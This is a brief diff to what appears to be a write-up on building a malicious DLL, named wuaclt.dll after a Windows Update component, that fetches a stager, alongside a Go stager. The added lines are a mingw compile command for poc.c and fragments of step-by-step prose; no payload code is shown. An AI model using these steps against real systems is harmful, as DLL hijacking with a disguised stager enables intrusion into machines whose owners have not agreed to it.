@@ -791,8 +791,10 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 First ill modify the code used for the DLL, to get the stager and store it in `C:\Temp`
 
 ```python
-
+x86_64-w64-mingw32-gcc -shared poc.c -o wuaclt.dll
 ```
+
+Then ill compile the DLL
 
 ```go
 // +build windows
@@ -860,3 +862,4 @@ func main() {
 }
 ```
 
+Then ill create a file called `stager.go` which will
